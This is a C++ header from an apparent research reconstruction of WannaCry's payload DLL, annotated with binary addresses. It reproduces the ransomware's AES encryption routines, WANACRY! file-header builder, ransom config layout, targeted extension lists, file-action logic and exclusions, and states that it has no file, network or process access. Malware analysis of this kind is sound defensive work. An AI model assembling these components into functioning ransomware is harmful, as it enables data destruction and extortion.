// ===========================================================================
// wcry_core.h — pure, OS-independent core of the wcry_payload.dll
// reconstruction (WannaCry, MD5 f351e1fcca0c4ea05fc44d15a17f8b36).
//
// RESEARCH ARTIFACT — defensive/educational reconstruction. This header holds
// ONLY benign, pure data-transformation logic:
//   * standard AES-128/192/256 software encrypt implementation built on the
//     tables extracted from the binary (byte-verified == FIPS-197 / standard,
//     see ../../reconstruction/shared/crypto_test/CRYPTO_TEST.md — 15/15 PASS)
//   * WANACRY! container-header parse/build (pure struct work)
//   * c.wnry config struct + validation (pure)
//   * extension-class / file-action state machines (pure)
//   * path-exclusion table (pure)
//   * install-tag generator core (pure, seeded)
//   * mutex NAME string helpers (pure string work — no handle is created)
//   * CryptoAPI RSA key-BLOB header walk (parse only — no key import, no CSP)
//
// NO file IO, NO process/thread/mutex/network/crypto-provider access here.
// Every function cites its Ghidra address. Evidence:
//   ../../reconstruction/encryptor/{ghidra_decompile.c,function_map.md,REVIEW.md}
// ===========================================================================
#ifndef WCRY_CORE_H
#define WCRY_CORE_H

#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cwchar>

// ---------------------------------------------------------------------------
// Portable wide-string helpers (the binary uses MSVC _wcsicmp/_wcsnicmp;
// glibc lacks them, so the reconstruction carries its own).
// ---------------------------------------------------------------------------
inline int wcry_towlower_ascii(wchar_t c)
{
    return (c >= L'A' && c <= L'Z') ? (int)(c - L'A' + L'a') : (int)c;
}

inline int wcry_wcsicmp(const wchar_t *a, const wchar_t *b)
{
    while (*a && wcry_towlower_ascii(*a) == wcry_towlower_ascii(*b)) { a++; b++; }
    return wcry_towlower_ascii(*a) - wcry_towlower_ascii(*b);
}

inline int wcry_wcsnicmp(const wchar_t *a, const wchar_t *b, size_t n)
{
    for (size_t i = 0; i < n; i++) {
        int ca = wcry_towlower_ascii(a[i]), cb = wcry_towlower_ascii(b[i]);
        if (ca != cb) return ca - cb;
        if (ca == 0) return 0;
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Little/big-endian load-store (tables are LE u32 on disk; key-schedule words
// are big-endian-convention per the T-table cipher — CRYPTO_TEST.md "Notes").
// ---------------------------------------------------------------------------
inline uint32_t wcry_le32(const uint8_t *p)
{
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}
inline uint64_t wcry_le64(const uint8_t *p)
{
    return (uint64_t)wcry_le32(p) | ((uint64_t)wcry_le32(p + 4) << 32);
}
inline void wcry_put_le32(uint8_t *p, uint32_t v)
{
    p[0] = (uint8_t)v; p[1] = (uint8_t)(v >> 8);
    p[2] = (uint8_t)(v >> 16); p[3] = (uint8_t)(v >> 24);
}
inline void wcry_put_le64(uint8_t *p, uint64_t v)
{
    wcry_put_le32(p, (uint32_t)v);
    wcry_put_le32(p + 4, (uint32_t)(v >> 32));
}
inline uint32_t wcry_be32(const uint8_t *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

// ===========================================================================
// AES — software implementation. ENCRYPT-ONLY, exactly like the binary
// (REVIEW #1/#2/#3: no decrypt primitive exists; inv tables only feed the
// key-schedule InvMixColumn). Tables byte-verified against the binary:
//   SBOX  @VA 0x10007A3C  (== FIPS-197, CRYPTO_TEST T1)
//   RCON  @VA 0x1000AC3C  (30 bytes; first 10 = AES-128 constants, T2)
//   Te0..Te3 @0x10007C3C/0x1000803C/0x1000843C/0x1000883C (standard, T3)
//   Td0..Td3 @0x10009C3C/0x1000A03C/0x1000A43C/0x1000A83C (InvMixColumn path)
// The T-tables are generated from SBOX at first use; CRYPTO_TEST T3 proves
// generated == extracted (Te0[x] = [2S,S,S,3S]; Te_{k+1} = rotr(Te_k,8)).
// ===========================================================================
static const uint8_t WCRY_SBOX256[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};

// Extracted @0x1000AC3C, 30 bytes on disk (CRYPTO_TEST T2).
static const uint8_t WCRY_RCON30[30] = {
    0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36,
    0x6c,0xd8,0xab,0x4d,0x9a,0x2f,0x5e,0xbc,0x63,0xc6,
    0x97,0x35,0x6a,0xd4,0xb3,0x7d,0xfa,0xef,0xc5,0x91
};

inline uint32_t wcry_xtime(uint32_t b)
{
    return ((b << 1) & 0xFFu) ^ ((b & 0x80u) ? 0x1Bu : 0u);
}

struct WcryTeTables { uint32_t te0[256], te1[256], te2[256], te3[256]; };
struct WcryTdTables { uint32_t td0[256], td1[256], td2[256], td3[256]; uint8_t isbox[256]; };

// Single-threaded lazy init (selftest/research use only — mirrors the binary's
// static .rdata tables, which need no init at all).
inline const WcryTeTables *wcry_aes_te(void)
{
    static WcryTeTables t;
    static int init = 0;
    if (!init) {
        for (int x = 0; x < 256; x++) {
            uint32_t s  = WCRY_SBOX256[x];
            uint32_t s2 = wcry_xtime(s);
            uint32_t s3 = s2 ^ s;
            t.te0[x] = (s2 << 24) | (s << 16) | (s << 8) | s3;
        }
        for (int x = 0; x < 256; x++) {
            t.te1[x] = (t.te0[x] >> 8) | (t.te0[x] << 24);
            t.te2[x] = (t.te1[x] >> 8) | (t.te1[x] << 24);
            t.te3[x] = (t.te2[x] >> 8) | (t.te2[x] << 24);
        }
        init = 1;
    }
    return &t;
}

inline const WcryTdTables *wcry_aes_td(void)
{
    static WcryTdTables t;
    static int init = 0;
    if (!init) {
        for (int x = 0; x < 256; x++) t.isbox[WCRY_SBOX256[x]] = (uint8_t)x;
        for (int x = 0; x < 256; x++) {
            uint32_t i  = t.isbox[x];
            uint32_t i2 = wcry_xtime(i);
            uint32_t i4 = wcry_xtime(i2);
            uint32_t i8 = wcry_xtime(i4);
            uint32_t i9 = i8 ^ i, ib = i8 ^ i2 ^ i, id = i8 ^ i4 ^ i, ie = i8 ^ i4 ^ i2 ^ i;
            t.td0[x] = (ie << 24) | (i9 << 16) | (id << 8) | ib;
        }
        for (int x = 0; x < 256; x++) {
            t.td1[x] = (t.td0[x] >> 8) | (t.td0[x] << 24);
            t.td2[x] = (t.td1[x] >> 8) | (t.td1[x] << 24);
            t.td3[x] = (t.td2[x] >> 8) | (t.td2[x] << 24);
        }
        init = 1;
    }
    return &t;
}

// AesCtx — ~0x458-byte object [AesCtx::SetKey 10005DC0]. Field layout mirrors
// the original offsets (see comments); only the key schedules + IV persist —
// the KEY ITSELF IS NEVER STORED (REVIEW: +0x3D0/+0x3F0 both receive IV bytes).
struct WcryAesCtx {
    uint32_t ready;             // +0x004
    uint32_t enc[60];           // +0x008 enc round keys
    uint32_t dec[60];           // +0x1E8 dec round keys (InvMixColumn of enc)
    uint32_t keySize;           // +0x3C8 (16/24/32)
    uint32_t ivSize;            // +0x3CC (16/24/32 — also selects 06640 shift paths)
    uint8_t  iv[16];            // +0x3F0 CBC chain register
    uint32_t Nr;                // +0x410 rounds
};

// [10005DC0] Returns 0 on success, -1 where the original throws (NULL key /
// keySize or ivSize not in {16,24,32}).
inline int wcry_aes_set_key(WcryAesCtx *c, const uint8_t *key, int keySize,
                            const uint8_t *iv, int ivSize)
{
    if (key == NULL ||
        (keySize != 16 && keySize != 24 && keySize != 32) ||
        (ivSize  != 16 && ivSize  != 24 && ivSize  != 32))
        return -1;

    c->keySize = (uint32_t)keySize;
    c->ivSize  = (uint32_t)ivSize;
    // Rounds dispatch (decompile 3935-3950, REVIEW AesSetKey): for the
    // 128-bit key the count follows the BLOCK (iv) size — Rijndael
    // block-size behaviour, not an AES parameter. 16/16→10 is the only
    // combination the binary ever exercises (WannaCry file encryption).
    if (keySize == 16)
        c->Nr = (ivSize == 16) ? 10u : (ivSize == 24 ? 12u : 14u);
    else
        c->Nr = 14u;            // key24→14|16, key32→14 per REVIEW; 14 used

    memset(c->iv, 0, sizeof(c->iv));
    if (iv) memcpy(c->iv, iv, 16);   // +0x3F0 chain register

    // Rijndael key expansion (Rcon @1000AC3C, SBOX @10007A3C).
    const int Nk = keySize / 4;
    const int total = (int)(c->Nr + 1u) * 4;      // <= 60 words
    uint32_t w[60];
    for (int i = 0; i < Nk; i++)
        w[i] = wcry_be32(key + 4 * i);
    int rc = 0;
    for (int i = Nk; i < total; i++) {
        uint32_t t = w[i - 1];
        if (i % Nk == 0) {
            t = (t << 8) | (t >> 24);              // RotWord
            t = ((uint32_t)WCRY_SBOX256[(t >> 24) & 0xFF] << 24) |
                ((uint32_t)WCRY_SBOX256[(t >> 16) & 0xFF] << 16) |
                ((uint32_t)WCRY_SBOX256[(t >>  8) & 0xFF] <<  8) |
                (uint32_t)WCRY_SBOX256[t & 0xFF];  // SubWord
            t ^= (uint32_t)WCRY_RCON30[rc++] << 24;
        } else if (Nk > 6 && i % Nk == 4) {
            t = ((uint32_t)WCRY_SBOX256[(t >> 24) & 0xFF] << 24) |
                ((uint32_t)WCRY_SBOX256[(t >> 16) & 0xFF] << 16) |
                ((uint32_t)WCRY_SBOX256[(t >>  8) & 0xFF] <<  8) |
                (uint32_t)WCRY_SBOX256[t & 0xFF];  // AES-256 extra SubWord
        }
        w[i] = w[i - Nk] ^ t;
    }
    memcpy(c->enc, w, sizeof(uint32_t) * (size_t)total);

    // dec[] schedule (decompile: InvMixColumn tables @10009C3C..A83C applied
    // to the enc schedule): equivalent inverse keys dec[0]=enc[Nr],
    // dec[r]=InvMixColumn(enc[r]) for 1..Nr-1, dec[Nr]=enc[0]. Never used by
    // any encrypt path — the binary still builds it, so the reconstruction does.
    const WcryTdTables *td = wcry_aes_td();
    for (int j = 0; j < 4; j++) {
        c->dec[j] = w[total - 4 + j];
        c->dec[(int)c->Nr * 4 + j] = w[j];
    }
    for (int r = 1; r < (int)c->Nr; r++) {
        for (int j = 0; j < 4; j++) {
            uint32_t e = w[r * 4 + j];
            c->dec[r * 4 + j] = td->td0[(e >> 24) & 0xFF] ^ td->td1[(e >> 16) & 0xFF] ^
                                td->td2[(e >> 8) & 0xFF]  ^ td->td3[e & 0xFF];
        }
    }
    c->ready = 1;   // +0x004 ready flag
    return 0;
}

// [10006280 AesEncryptBlock128 / 10006640 192-256 path] T-table rounds with a
// final SBOX round, MSB-first byte extraction (CRYPTO_TEST encrypt_block_te).
inline void wcry_aes_encrypt_block(const WcryAesCtx *c, const uint8_t *in, uint8_t *out)
{
    const WcryTeTables *t = wcry_aes_te();
    const uint32_t *rk = c->enc;
    uint32_t t0 = wcry_be32(in)      ^ rk[0];
    uint32_t t1 = wcry_be32(in + 4)  ^ rk[1];
    uint32_t t2 = wcry_be32(in + 8)  ^ rk[2];
    uint32_t t3 = wcry_be32(in + 12) ^ rk[3];
    for (uint32_t r = 1; r < c->Nr; r++) {
        rk += 4;
        uint32_t k0 = rk[0], k1 = rk[1], k2 = rk[2], k3 = rk[3];
        uint32_t s0 = t->te0[(t0 >> 24) & 0xFF] ^ t->te1[(t1 >> 16) & 0xFF] ^
                      t->te2[(t2 >>  8) & 0xFF] ^ t->te3[ t3        & 0xFF] ^ k0;
        uint32_t s1 = t->te0[(t1 >> 24) & 0xFF] ^ t->te1[(t2 >> 16) & 0xFF] ^
                      t->te2[(t3 >>  8) & 0xFF] ^ t->te3[ t0        & 0xFF] ^ k1;
        uint32_t s2 = t->te0[(t2 >> 24) & 0xFF] ^ t->te1[(t3 >> 16) & 0xFF] ^
                      t->te2[(t0 >>  8) & 0xFF] ^ t->te3[ t1        & 0xFF] ^ k2;
        uint32_t s3 = t->te0[(t3 >> 24) & 0xFF] ^ t->te1[(t0 >> 16) & 0xFF] ^
                      t->te2[(t1 >>  8) & 0xFF] ^ t->te3[ t2        & 0xFF] ^ k3;
        t0 = s0; t1 = s1; t2 = s2; t3 = s3;
    }
    rk += 4;   // final round: SubBytes + ShiftRows + AddRoundKey (no T-table)
    out[0]  = (uint8_t)(WCRY_SBOX256[(t0 >> 24) & 0xFF] ^ (uint8_t)(rk[0] >> 24));
    out[1]  = (uint8_t)(WCRY_SBOX256[(t1 >> 16) & 0xFF] ^ (uint8_t)(rk[0] >> 16));
    out[2]  = (uint8_t)(WCRY_SBOX256[(t2 >>  8) & 0xFF] ^ (uint8_t)(rk[0] >>  8));
    out[3]  = (uint8_t)(WCRY_SBOX256[ t3        & 0xFF] ^ (uint8_t) rk[0]);
    out[4]  = (uint8_t)(WCRY_SBOX256[(t1 >> 24) & 0xFF] ^ (uint8_t)(rk[1] >> 24));
    out[5]  = (uint8_t)(WCRY_SBOX256[(t2 >> 16) & 0xFF] ^ (uint8_t)(rk[1] >> 16));
    out[6]  = (uint8_t)(WCRY_SBOX256[(t3 >>  8) & 0xFF] ^ (uint8_t)(rk[1] >>  8));
    out[7]  = (uint8_t)(WCRY_SBOX256[ t0        & 0xFF] ^ (uint8_t) rk[1]);
    out[8]  = (uint8_t)(WCRY_SBOX256[(t2 >> 24) & 0xFF] ^ (uint8_t)(rk[2] >> 24));
    out[9]  = (uint8_t)(WCRY_SBOX256[(t3 >> 16) & 0xFF] ^ (uint8_t)(rk[2] >> 16));
    out[10] = (uint8_t)(WCRY_SBOX256[(t0 >>  8) & 0xFF] ^ (uint8_t)(rk[2] >>  8));
    out[11] = (uint8_t)(WCRY_SBOX256[ t1        & 0xFF] ^ (uint8_t) rk[2]);
    out[12] = (uint8_t)(WCRY_SBOX256[(t3 >> 24) & 0xFF] ^ (uint8_t)(rk[3] >> 24));
    out[13] = (uint8_t)(WCRY_SBOX256[(t0 >> 16) & 0xFF] ^ (uint8_t)(rk[3] >> 16));
    out[14] = (uint8_t)(WCRY_SBOX256[(t1 >>  8) & 0xFF] ^ (uint8_t)(rk[3] >>  8));
    out[15] = (uint8_t)(WCRY_SBOX256[ t2        & 0xFF] ^ (uint8_t) rk[3]);
}

// [10006940 AesCryptModes] ALL modes are ENCRYPT transforms — this DLL cannot
// decrypt (REVIEW #3): 1 = CBC-encrypt (xor-then-encrypt), 2 = CFB-style
// encrypt (out = E(chain) ^ in; chain = out — no caller in the whole
// decompile), 0/other = ECB-encrypt. Returns -1 where the original throws
// (len not a multiple of the block size) or the context is not keyed.
inline int wcry_aes_crypt_modes(WcryAesCtx *c, const uint8_t *in, uint8_t *out,
                                uint32_t len, int mode)
{
    if (!c->ready) return -1;
    if ((len & 15u) != 0u) return -1;
    uint8_t chain[16], tmp[16];
    memcpy(chain, c->iv, 16);
    if (mode == 1) {                                    // CBC-encrypt
        for (uint32_t b = 0; b < len; b += 16) {
            for (int i = 0; i < 16; i++) chain[i] ^= in[b + (uint32_t)i];
            wcry_aes_encrypt_block(c, chain, &out[b]);
            memcpy(chain, &out[b], 16);
        }
    } else if (mode == 2) {                             // CFB-style encrypt
        for (uint32_t b = 0; b < len; b += 16) {
            wcry_aes_encrypt_block(c, chain, tmp);
            for (int i = 0; i < 16; i++) out[b + (uint32_t)i] = (uint8_t)(tmp[i] ^ in[b + (uint32_t)i]);
            memcpy(chain, &out[b], 16);
        }
    } else {                                            // ECB-encrypt
        for (uint32_t b = 0; b < len; b += 16)
            wcry_aes_encrypt_block(c, &in[b], &out[b]);
    }
    return 0;
}

// ===========================================================================
// WANACRY! container header (formats.md §1/§3; verified on t.wnry):
//   0x000 "WANACRY!" | 0x008 u32 rsaLen | 0x00C rsa ct [rsaLen]
//   0x10C u32 type   | 0x110 u64 payloadSize | 0x118 AES-128-CBC payload
// The fixed offsets 0x10C/0x110 hold only when rsaLen==0x100 — the binary's
// already-encrypted probe (10001960) likewise full-parses only rsaLen==0x100.
// Reader gate: rsaLen < 0x201 (REVIEW #15).
// ===========================================================================
#define WCRY_HEADER_FIXED_SIZE 0x118   /* for rsaLen == 0x100 */
static const char WCRY_MAGIC[8] = { 'W','A','N','A','C','R','Y','!' };  // @1000CBE8

struct WcryHeader {
    uint32_t rsaLen;
    uint32_t fileType;
    uint64_t payloadSize;
};

// Magic + rsaLen only. 0 = ok.
inline int wcry_header_parse_base(const uint8_t *buf, size_t len, uint32_t *rsaLen)
{
    if (buf == NULL || rsaLen == NULL || len < 12) return -1;
    if (memcmp(buf, WCRY_MAGIC, 8) != 0) return -1;
    uint32_t rl = wcry_le32(buf + 8);
    if (rl >= 0x201u) return -1;            // reader gate [10001960, REVIEW #15]
    *rsaLen = rl;
    return 0;
}

// Full parse — fixed layout, requires rsaLen == 0x100 (probe behaviour).
inline int wcry_header_parse_full(const uint8_t *buf, size_t len, WcryHeader *h)
{
    uint32_t rl;
    if (h == NULL || wcry_header_parse_base(buf, len, &rl) != 0) return -1;
    if (rl != 0x100u || len < (size_t)WCRY_HEADER_FIXED_SIZE) return -1;
    h->rsaLen      = rl;
    h->fileType    = wcry_le32(buf + 0x10C);
    h->payloadSize = wcry_le64(buf + 0x110);
    return 0;
}

// Build a header into out; returns bytes written (12+rsaLen+12; 0x118 when
// rsaLen==0x100) or -1 on overflow/bad rsaLen. Pure buffer work.
inline int wcry_header_build(uint8_t *out, size_t cap, const uint8_t *rsaCt,
                             uint32_t rsaLen, uint32_t fileType, uint64_t payloadSize)
{
    if (out == NULL || rsaCt == NULL || rsaLen >= 0x201u) return -1;
    const size_t need = 12u + (size_t)rsaLen + 12u;
    if (cap < need) return -1;
    memcpy(out, WCRY_MAGIC, 8);
    wcry_put_le32(out + 8, rsaLen);
    memcpy(out + 12, rsaCt, rsaLen);
    wcry_put_le32(out + 12 + rsaLen, fileType);
    wcry_put_le64(out + 16 + rsaLen, payloadSize);
    return (int)need;
}

// ===========================================================================
// c.wnry config — fixed 0x30C-byte struct (formats.md §2; ReadConfig 10001000).
// Layout offsets asserted below; byte-verified fields marked.
// ===========================================================================
#pragma pack(push, 1)
struct WcryConfig {
    uint32_t f000;                  // +0x000 observed 0
    uint32_t f004;                  // +0x004 observed 1
    uint8_t  pad008[0x6C - 0x08];
    uint32_t persistTick;           // +0x6C last persist tick (c.wnry-persisted, LAB_10004990)
    uint32_t f070;                  // +0x070 observed 3
    uint32_t f074;                  // +0x074 observed 7
    float    priceUsd;              // +0x078 observed 300.0f
    uint8_t  pad07C[0xE0 - 0x7C];
    char     onions[0x1DC - 0xE0];  // 5 payment hosts ';'-joined (verified)
    char     torUrl[0x30C - 0x1DC]; // torbrowser zip URL (verified)
};
#pragma pack(pop)

static_assert(sizeof(WcryConfig) == 0x30C, "c.wnry must be 0x30C bytes");
static_assert(offsetof(WcryConfig, persistTick) == 0x6C, "persistTick @0x6C");
static_assert(offsetof(WcryConfig, f070) == 0x070, "f070 @0x70");
static_assert(offsetof(WcryConfig, priceUsd) == 0x078, "priceUsd @0x78");
static_assert(offsetof(WcryConfig, onions) == 0x0E0, "onions @0xE0");
static_assert(offsetof(WcryConfig, torUrl) == 0x1DC, "torUrl @0x1DC");

// Pure structural validation against the observed field markers.
inline int wcry_config_validate(const WcryConfig *cfg)
{
    if (cfg == NULL) return -1;
    if (cfg->f000 != 0u || cfg->f004 != 1u) return -1;
    if (!(cfg->priceUsd > 0.0f)) return -1;
    if (cfg->onions[0] == '\0' || strstr(cfg->onions, ".onion") == NULL) return -1;
    if (strncmp(cfg->torUrl, "https://", 8) != 0) return -1;
    return 0;
}

// ===========================================================================
// Extension classification [10002D60]. Lists are the EXACT pointer arrays
// extracted from the binary: class 2 @0x1000C098 (24 entries), class 3
// @0x1000C0FC (155 entries, includes the binary's duplicated ".sldm").
// exe/dll=1, .WNCRY=6, list2=2, list3=3, .WNCRYT=4, .WNCYR=5, other=0 (REVIEW #7).
// ===========================================================================
inline const wchar_t *const *wcry_ext_table(int cls, int *count)
{
    static const wchar_t *const class2[] = {
        L".doc", L".docx", L".xls", L".xlsx", L".ppt", L".pptx", L".pst", L".ost",
        L".msg", L".eml", L".vsd", L".vsdx", L".txt", L".csv", L".rtf", L".123",
        L".wks", L".wk1", L".pdf", L".dwg", L".onetoc2", L".snt", L".jpeg", L".jpg"
    };
    static const wchar_t *const class3[] = {
        L".docb", L".docm", L".dot", L".dotm", L".dotx", L".xlsm", L".xlsb", L".xlw",
        L".xlt", L".xlm", L".xlc", L".xltx", L".xltm", L".pptm", L".pot", L".pps",
        L".ppsm", L".ppsx", L".ppam", L".potx", L".potm", L".edb", L".hwp", L".602",
        L".sxi", L".sti", L".sldx", L".sldm", L".sldm", L".vdi", L".vmdk", L".vmx",
        L".gpg", L".aes", L".ARC", L".PAQ", L".bz2", L".tbk", L".bak", L".tar",
        L".tgz", L".gz", L".7z", L".rar", L".zip", L".backup", L".iso", L".vcd",
        L".bmp", L".png", L".gif", L".raw", L".cgm", L".tif", L".tiff", L".nef",
        L".psd", L".ai", L".svg", L".djvu", L".m4u", L".m3u", L".mid", L".wma",
        L".flv", L".3g2", L".mkv", L".3gp", L".mp4", L".mov", L".avi", L".asf",
        L".mpeg", L".vob", L".mpg", L".wmv", L".fla", L".swf", L".wav", L".mp3",
        L".sh", L".class", L".jar", L".java", L".rb", L".asp", L".php", L".jsp",
        L".brd", L".sch", L".dch", L".dip", L".pl", L".vb", L".vbs", L".ps1",
        L".bat", L".cmd", L".js", L".asm", L".h", L".pas", L".cpp", L".c", L".cs",
        L".suo", L".sln", L".ldf", L".mdf", L".ibd", L".myi", L".myd", L".frm",
        L".odb", L".dbf", L".db", L".mdb", L".accdb", L".sql", L".sqlitedb",
        L".sqlite3", L".asc", L".lay6", L".lay", L".mml", L".sxm", L".otg", L".odg",
        L".uop", L".std", L".sxd", L".otp", L".odp", L".wb2", L".slk", L".dif",
        L".stc", L".sxc", L".ots", L".ods", L".3dm", L".max", L".3ds", L".uot",
        L".stw", L".sxw", L".ott", L".odt", L".pem", L".p12", L".csr", L".crt",
        L".key", L".pfx", L".der"
    };
    if (count) { *count = 0; }
    switch (cls) {
    case 2:
        static_assert(sizeof(class2) / sizeof(class2[0]) == 24, "class2 = 24 entries");
        if (count) *count = (int)(sizeof(class2) / sizeof(class2[0]));
        return class2;
    case 3:
        static_assert(sizeof(class3) / sizeof(class3[0]) == 155, "class3 = 155 entries");
        if (count) *count = (int)(sizeof(class3) / sizeof(class3[0]));
        return class3;
    default:
        return NULL;
    }
}

inline int wcry_get_file_ext_class(const wchar_t *path)   // [10002D60]
{
    if (path == NULL) return 0;
    const wchar_t *dot = wcsrchr(path, L'.');
    if (dot == NULL) return 0;
    if (wcry_wcsicmp(dot, L".exe") == 0 || wcry_wcsicmp(dot, L".dll") == 0) return 1;
    if (wcry_wcsicmp(dot, L".WNCRY") == 0) return 6;
    for (int cls = 2; cls <= 3; cls++) {
        int n = 0;
        const wchar_t *const *tab = wcry_ext_table(cls, &n);
        for (int i = 0; i < n; i++)
            if (wcry_wcsicmp(dot, tab[i]) == 0) return cls;
    }
    if (wcry_wcsicmp(dot, L".WNCRYT") == 0) return 4;
    // tail per decompile 1432: .WNCYR→5, other→0 [REVIEW #7]
    return (wcry_wcsicmp(dot, L".WNCYR") == 0) ? 5 : 0;
}

// ===========================================================================
// File-action state machine [10002E70]. Inputs are the Cryptor fields:
// fileClass +0x4E0, fileSize +0x4D8, stopFlag +0x4DC (walker bound 0xC7FFFFF
// HERE — 0xC800000 belongs only to the ProcessFile carrot, REVIEW #8).
// Returns action 0..4 (0 none, 1 delete, 2 rename-probe, 3 stage-encrypt, 4 finalize).
// ===========================================================================
inline int wcry_decide_file_action(int fileClass, uint32_t fileSize,
                                   int stopFlag, unsigned stage)
{
    if (stage > 3u) return 4;
    if (fileClass == 0) return 1;
    if (stage == 3u) return 4;
    if (fileClass == 5) return 1;
    if (fileClass == 4) return 2;
    // decompile 1463-1468 short-circuit: when the stop flag is set, the size
    // compare never runs and bVar2 stays false (only reachable use is the
    // LAB_10002F56 return, which requires tooBig == 0, i.e. !stopFlag).
    int tooSmall = 0;
    int tooBig;
    if (stopFlag) {
        tooBig = 1;
    } else {
        tooSmall = (fileSize < 0x401u);
        tooBig   = tooSmall || (fileSize > 0xC7FFFFFu);
    }
    if (stage == 1u) {
        if (fileClass == 2) {
            if (tooBig) return 3;
            return tooSmall ? 1 : 4;        // decompile 1475: bVar2 ? 1 : 4
        }
        if (fileClass == 3) return 1;
    } else if (stage == 2u) {
        if (fileClass == 2) return 1;
        if (fileClass == 3) {
            if (tooBig) return 3;
            return tooSmall ? 1 : 4;
        }
    }
    return 0;
}

// ===========================================================================
// Path exclusion table [100032C0]. Byte-verified strings; semantics follow
// the decompile exactly:
//   * "\\\\" prefix (DAT_1000cc14) → UNC: probe = wcsstr(path, "$\\") (DAT_1000ced4)
//   * else local: probe = path + 1
//   * common: probe += 1  (local ⇒ skips the drive letter; "C:\Intel" → "\Intel")
//   * equality vs \Intel, \ProgramData, \WINDOWS, \Program Files,
//     \Program Files (x86); substring vs \AppData\Local\Temp,
//     \Local Settings\Temp
//   * then NAME (_wcsicmp): " This folder protects against ransomware. …"
//     (LEADING SPACE, byte-verified @0x1000CD58), "Temporary Internet Files",
//     "Content.IE5"
// ===========================================================================
inline int wcry_is_path_excluded(const wchar_t *dirPath, const wchar_t *name)
{
    const wchar_t *probe = NULL;
    if (wcry_wcsnicmp(dirPath, L"\\\\", 2) == 0)
        probe = wcsstr(dirPath, L"$\\");
    else if (wcslen(dirPath) >= 2)              // length guard added (original: none)
        probe = dirPath + 1;
    if (probe != NULL) {
        probe++;                                 // decompile 1701: common +1
        if (wcry_wcsicmp(probe, L"\\Intel") == 0) return 1;
        if (wcry_wcsicmp(probe, L"\\ProgramData") == 0) return 1;
        if (wcry_wcsicmp(probe, L"\\WINDOWS") == 0) return 1;
        if (wcry_wcsicmp(probe, L"\\Program Files") == 0) return 1;
        if (wcry_wcsicmp(probe, L"\\Program Files (x86)") == 0) return 1;
        if (wcsstr(probe, L"\\AppData\\Local\\Temp") != NULL) return 1;
        if (wcsstr(probe, L"\\Local Settings\\Temp") != NULL) return 1;
    }
    if (wcry_wcsicmp(name, L" This folder protects against ransomware. Modifying it will reduce protection") == 0)
        return 1;
    if (wcry_wcsicmp(name, L"Temporary Internet Files") == 0) return 1;
    return (wcry_wcsicmp(name, L"Content.IE5") == 0) ? 1 : 0;
}

// ===========================================================================
// Install tag [100014A0]. Seed = product of the hostname's UTF-16 units
// (GetComputerNameW buffer); len = rand() & 0x80000007 ∈ 0..7 (MSVC rand
// 0..0x7FFF, REVIEW #16) ⇒ 8-15 lowercase letters then EXACTLY 3 digits.
// Only the seeded core lives here; the Win32 hostname fetch stays in the .cpp.
// ===========================================================================
inline unsigned wcry_tag_seed_host16(const uint16_t *host, size_t n)
{
    unsigned seed = 1;
    for (size_t i = 0; i < n; i++) {
        if (host[i] == 0) break;
        seed *= (unsigned)host[i];
    }
    return seed;
}

inline char *wcry_gen_random_tag_from_seed(unsigned seed, char *out)
{
    srand(seed);
    int len = (int)(((unsigned)rand()) & 0x80000007u);   // ∈ 0..7
    int i = 0;
    for (; i < len + 8; i++)  out[i] = (char)(rand() % 26 + 'a');
    for (; i < len + 11; i++) out[i] = (char)(rand() % 10 + '0');  // exactly 3 digits
    out[i] = '\0';
    return out;
}

// ===========================================================================
// Mutex NAME handling — pure string work only; no handle is opened/created
// here (creation itself is stubbed in the .cpp). Byte-verified wiring:
//   0x1000D4F4 fmt "%s%d"
//   0x1000D4FC "Global\MsWinZonesCacheCounterMutexA"   (base)
//   0x1000D520 "Global\MsWinZonesCacheCounterMutexW"   (OpenMutexA literal,
//               10004600 — raw bytes say MutexW; REVIEW #6 said "…MutexA0")
//   10004600: sprintf(buf, "%s%d", base, instance) → CreateMutexA  (A0 build)
